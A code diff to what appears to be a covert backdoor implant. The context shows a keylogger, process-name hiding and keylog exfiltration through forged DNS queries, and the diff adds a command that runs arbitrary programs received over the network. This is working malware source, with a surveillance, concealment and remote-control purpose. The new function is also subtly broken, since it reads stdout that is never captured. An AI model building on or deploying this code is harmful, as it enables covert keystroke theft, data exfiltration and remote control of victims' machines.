@@ -17,10 +17,11 @@ import logging
 import time
 from pathlib import Path
 from datetime import datetime
+import subprocess
 
 # Custom Modules
 from utils.encryption import StreamEncryption, BlockEncryption
-from utils.shell import LIST, WGET, WATCH, KEYLOGGER, STOP, START, TRANSFER
+from utils.shell import LIST, WGET, WATCH, KEYLOGGER, STOP, START, TRANSFER, EXECUTE
 from utils.validation import validate_ipv4_address, validate_nic_interface
 from utils.process import hide_process_name
 from utils.keylogger import Keylogger
@@ -60,6 +61,7 @@ KEYLOGGER_INSTANCE = Keylogger()
 MONITOR_IDENTIFICATION = 14562
 KEYLOG_IDENTIFICATION = 32586
 GENERAL_MSG_IDENTIFICATION = 19375
+COMMAND_OUTPUT_IDENTIFICATION = 51486
 
 
 # List of legit hostnames
@@ -305,6 +307,16 @@ def transfer_keylogger():
         # Send keylog data
         forge_dns_query_block(data, KEYLOG_IDENTIFICATION)
 
+
+def execute_arbitrary_command(args: list) -> str:
+    """
+        Take list of arguments as input, execute the command,
+        and return the result as a string.
+    """
+    result = subprocess.run(args)
+    return result.stdout
+
+
 def packet_handler(pkt):
     """
     
@@ -325,6 +337,9 @@ def packet_handler(pkt):
                 start_keylogger()
             if argv[1] == TRANSFER:
                 transfer_keylogger()
+    if argv[0] == EXECUTE:
+        result = execute_arbitrary_command(argv[1:])
+        print(result)
 
 
 MONITOR = FileSystemMonitor()
